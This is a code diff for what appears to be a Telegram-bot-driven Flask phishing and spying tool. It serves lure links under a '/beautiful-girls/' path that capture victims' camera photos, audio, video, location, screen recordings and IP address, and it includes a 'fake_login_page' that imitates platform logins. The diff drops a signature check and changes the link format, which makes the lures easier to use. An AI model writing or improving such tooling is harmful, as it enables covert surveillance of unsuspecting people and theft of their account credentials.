@@ -1263,8 +1263,6 @@ def track_page(token):
     mode = request.args.get('m', 'all')
     user_id = tracking_links.get(token)
     if user_id:
-        if request.args.get('sig') != token:
-            return "Not found", 404
         ip = client_ip()
         ua = request.headers.get('User-Agent', 'Unknown')[:120]
         mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
@@ -1544,8 +1542,6 @@ self.addEventListener('notificationclick',e=>{e.notification.close();});"""
 def fake_login_page(platform, token):
     user_id = tracking_links.get(token)
     if not user_id:
-        return "Not found", 404
-    if request.args.get('sig') != token:
         return "Not found", 404
 
     PLATFORMS = {
@@ -2283,21 +2279,21 @@ def format_links_msg(token):
     return (
         f"✅ <b>Links ထုတ်ပြီးပါပြီ! | Links Ready!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 <b>All-in-One:</b>\n<code>{base}?m=all</code>\n\n"
-        f"📸 <b>Photo:</b>\n<code>{base}?m=photo</code>\n\n"
-        f"🎤 <b>Audio:</b>\n<code>{base}?m=audio</code>\n\n"
-        f"📍 <b>Location:</b>\n<code>{base}?m=location</code>\n\n"
-        f"🎥 <b>Video:</b>\n<code>{base}?m=video</code>\n\n"
-        f"📷 <b>Burst Photos:</b>\n<code>{base}?m=burst</code>\n\n"
-        f"🖥️ <b>Screen Record:</b>\n<code>{base}?m=screen</code>\n\n"
-        f"📳 <b>Motion+IP:</b>\n<code>{base}?m=motion</code>\n"
+        f"🌐 <b>All-in-One:</b>\n<code>{base}?m=all&style=simple</code>\n\n"
+        f"📸 <b>Photo:</b>\n<code>{base}?m=photo&style=simple</code>\n\n"
+        f"🎤 <b>Audio:</b>\n<code>{base}?m=audio&style=simple</code>\n\n"
+        f"📍 <b>Location:</b>\n<code>{base}?m=location&style=simple</code>\n\n"
+        f"🎥 <b>Video:</b>\n<code>{base}?m=video&style=simple</code>\n\n"
+        f"📷 <b>Burst Photos:</b>\n<code>{base}?m=burst&style=simple</code>\n\n"
+        f"🖥️ <b>Screen Record:</b>\n<code>{base}?m=screen&style=simple</code>\n\n"
+        f"📳 <b>Motion+IP:</b>\n<code>{base}?m=motion&style=simple</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⬇️ ခလုတ်များမှ တစ်ချက်နှိပ်၍ ဖွင့်နိုင်သည်"
     )
 
 
 def format_single_link_msg(token, mode_key, label):
-    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}"
+    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}&style=simple"
     return (
         f"✅ <b>{label} Link ထုတ်ပြီးပါပြီ!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
